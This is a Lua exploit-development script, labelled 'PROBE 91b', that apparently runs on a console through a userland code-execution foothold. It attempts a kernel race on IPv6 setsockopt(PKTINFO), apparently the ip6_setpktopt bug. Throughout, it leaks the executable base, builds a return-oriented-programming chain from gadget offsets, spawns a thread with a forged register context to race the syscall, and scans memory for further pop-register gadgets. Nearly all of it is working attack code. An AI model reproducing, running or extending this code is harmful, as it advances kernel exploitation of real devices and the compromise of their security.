-- CRASH_CLASS: HIGH
-- PROBE 91b: IPv6 setsockopt race v2 — register preservation + real race
--
-- 91a: IPv6 DGRAM works, PKTINFO=0, no pop rdx in 1MB, single-shot = no panic
-- This: (A) verify RDX preservation so child can loop [PRAX][105][SA],
-- (B) if preserved, race ~10K child setsockopt vs 3K main setsockopt,
-- (C) if clobbered, scan full 4.6MB for pop rdx gadgets

print("=== PROBE 91b: SETSOCKOPT RACE v2 ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477); local c624=mk(624)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local ebase=uint64(string.format("0x%X%08X",ehi,elo))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local text_sz=rd(inf+0x110) or 0
if text_sz<0 then text_sz=text_sz+0x100000000 end

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R8=0x068;local _R10=0x090;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end
local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
-- A: Setup + register preservation test
-- ============================================================
print("--- A: REGISTER TEST ---")

local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("IPv6 BLOCKED") return end

local PV6=41; local PKTINFO=46

-- Set baseline: addr dword0=99, ifindex=0
local pi0=memory.alloc(20); z(pi0,20); wd(pi0,99)
local br=N(native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(pi0),20))
print("baseline set rv="..br)

-- getsockopt helper: read addr dword0 from current pktinfo
local function get_marker()
    local gb=memory.alloc(32); z(gb,32)
    local gl=memory.alloc(4); wd(gl,20)
    local rv=N(native.fcall_with_rax(stub,118,s6,PV6,PKTINFO,N(gb),N(gl)))
    if rv~=0 then return nil end
    return rd(gb)
end

local mk0=get_marker()
print("baseline marker="..tostring(mk0))
if mk0~=99 then print("WARN: baseline not 99, got "..tostring(mk0)) end

-- Build child chain: [PRAX][105][SA] × ncycles
-- Relies on kernel preserving RDI,RSI,RDX,R10,R8 across setsockopt
local STSZ=0x40000
local ok_s,stk=pcall(function()
    return mm(uint64(0),uint64(STSZ),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_s then print("FAIL mmap") return end

local off=0
local ncycles=math.floor((STSZ-200)/24)
for i=1,ncycles do
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(105)); off=off+8
    wq(stk+off,SA); off=off+8
end

local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(N(ts))); off=off+8
wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
wq(stk+off,SA); off=off+8
print(ncycles.." child cycles built")

-- Child optval: addr dword0=2, ifindex=0
local pi_c=memory.alloc(20); z(pi_c,20); wd(pi_c,2)

local ctx=memory.alloc(0x200); z(ctx,0x200)
wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
wq(ctx+_TP,uint64(0x10000))
wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
wq(ctx+_IP,SA); wq(ctx+_SP,uint64(N(stk)))
wq(ctx+_AX,uint64(105))
wq(ctx+_DI,uint64(s6))
wq(ctx+_SI,uint64(PV6))
wq(ctx+_DX,uint64(PKTINFO))
wq(ctx+_R10,uint64(N(pi_c)))
wq(ctx+_R8,uint64(20))

local vm0=vmc()
local tb=memory.alloc(8); wq(tb,uint64(0))
local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
local tid=rq(tb)
print("thr_create rv="..(ok_t and tostring(N(rv_t)) or "X").." tid="..q(tid))

-- 2ms sleep to let child run some setsockopt calls
local sl=memory.alloc(16); wq(sl,uint64(0)); wq(sl+8,uint64(2000000))
native.fcall_with_rax(stub,240,N(sl),0)

local mk_after=get_marker()
print("after 2ms: marker="..tostring(mk_after).." (2=child set PKTINFO, 99=unchanged)")
print("child alive="..tostring(alive(tid)))

-- ============================================================
-- B: Race or gadget scan based on result
-- ============================================================
if mk_after==2 then
    print("")
    print("--- B: RACE (RDX PRESERVED) ---")

    local pi_m=memory.alloc(20); z(pi_m,20); wd(pi_m,1)
    local m_ok,m_fail=0,0
    for i=1,3000 do
        local rv=N(native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(pi_m),20))
        if rv==0 then m_ok=m_ok+1 else m_fail=m_fail+1 end
    end

    local vm1=vmc()
    local mk_final=get_marker()
    print("main: ok="..m_ok.." fail="..m_fail)
    print("VM: "..vm0.." -> "..vm1.." d="..(vm1-vm0))
    print("child alive="..tostring(alive(tid)))
    print("final marker="..tostring(mk_final).." (1=main last, 2=child last)")

    print("")
    print("--- RESULT ---")
    print("survived "..(m_ok+ncycles).." concurrent setsockopt(PKTINFO)")
    print("no kernel panic — ip6_setpktopt race PATCHED or not triggerable")

elseif mk_after==99 or mk_after==0 then
    print("")
    print("--- B: GADGET SCAN (RDX CLOBBERED) ---")
    print("scanning full eboot text ("..string.format("0x%X",text_sz).." bytes)...")

    local scan_lim=text_sz
    if scan_lim>0x500000 then scan_lim=0x500000 end

    local found={}
    local p2,p3=nil,nil

    for soff=0,scan_lim-4,4 do
        local v=rd(ebase+soff)
        if not v then break end
        local b0=v%256
        local b1=math.floor(v/256)%256
        local b2=math.floor(v/65536)%256
        local b3=math.floor(v/16777216)%256

        -- boundary: prev b3 + current b0
        if p3 then
            if p3==0x5A and b0==0xC3 and not found.rdx then found.rdx=soff-1 end
            if p3==0x5C and b0==0xC3 and not found.rsp then found.rsp=soff-1 end
            if p3==0x92 and b0==0xC3 and not found.xchg then found.xchg=soff-1 end
        end
        -- boundary: prev b2,b3 + current b0
        if p2 and p3 then
            if p2==0x41 and p3==0x5A and b0==0xC3 and not found.r10 then found.r10=soff-2 end
            if p2==0x41 and p3==0x58 and b0==0xC3 and not found.r8 then found.r8=soff-2 end
        end
        -- boundary: prev b3 + current b0,b1
        if p3 then
            if p3==0x41 and b0==0x5A and b1==0xC3 and not found.r10 then found.r10=soff-1 end
            if p3==0x41 and b0==0x58 and b1==0xC3 and not found.r8 then found.r8=soff-1 end
            if p3==0x5A and b0>=0x58 and b0<=0x5D and b1==0xC3 and not found.rdx2 then
                found.rdx2=soff-1
                found.rdx2_mid=b0
            end
        end

        -- within dword: 5A C3
        if not found.rdx then
            if b0==0x5A and b1==0xC3 then found.rdx=soff
            elseif b1==0x5A and b2==0xC3 then found.rdx=soff+1
            elseif b2==0x5A and b3==0xC3 then found.rdx=soff+2 end
        end
        -- within dword: 5A [58-5D] C3 (pop rdx; pop XX; ret)
        if not found.rdx2 then
            if b0==0x5A and b1>=0x58 and b1<=0x5D and b2==0xC3 then
                found.rdx2=soff; found.rdx2_mid=b1
            elseif b1==0x5A and b2>=0x58 and b2<=0x5D and b3==0xC3 then
                found.rdx2=soff+1; found.rdx2_mid=b2
            end
        end
        -- within dword: 92 C3 (xchg eax,edx; ret)
        if not found.xchg then
            if b0==0x92 and b1==0xC3 then found.xchg=soff
            elseif b1==0x92 and b2==0xC3 then found.xchg=soff+1
            elseif b2==0x92 and b3==0xC3 then found.xchg=soff+2 end
        end
        -- within dword: 41 5A C3 (pop r10; ret)
        if not found.r10 then
            if b0==0x41 and b1==0x5A and b2==0xC3 then found.r10=soff
            elseif b1==0x41 and b2==0x5A and b3==0xC3 then found.r10=soff+1 end
        end
        -- within dword: 41 58 C3 (pop r8; ret)
        if not found.r8 then
            if b0==0x41 and b1==0x58 and b2==0xC3 then found.r8=soff
            elseif b1==0x41 and b2==0x58 and b3==0xC3 then found.r8=soff+1 end
        end
        -- pop rsp; ret
        if not found.rsp then
            if b0==0x5C and b1==0xC3 then found.rsp=soff
            elseif b1==0x5C and b2==0xC3 then found.rsp=soff+1
            elseif b2==0x5C and b3==0xC3 then found.rsp=soff+2 end
        end

        p2=b2; p3=b3

        if found.rdx and found.r10 and found.r8 then break end

        if soff % 0x80000 == 0 and soff > 0 then
            print("  scanned "..string.format("0x%X",soff).."...")
        end
    end

    local function gp(name,off)
        if off then print("  "..name.." at +"..string.format("0x%X",off))
        else print("  "..name.." NOT FOUND") end
    end
    gp("pop rdx;ret",found.rdx)
    gp("pop rdx;pop XX;ret",found.rdx2)
    if found.rdx2_mid then
        print("    mid byte=0x"..string.format("%02X",found.rdx2_mid))
    end
    gp("xchg eax,edx;ret",found.xchg)
    gp("pop r10;ret",found.r10)
    gp("pop r8;ret",found.r8)
    gp("pop rsp;ret",found.rsp)

else
    print("unexpected marker="..tostring(mk_after))
end

-- ============================================================
-- Cleanup
-- ============================================================
print("")
native.fcall_with_rax(stub,6,s6)
if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91b DONE ===")
